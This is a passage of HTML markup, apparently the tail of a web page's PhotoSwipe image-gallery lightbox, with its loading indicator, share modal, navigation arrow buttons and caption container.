                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
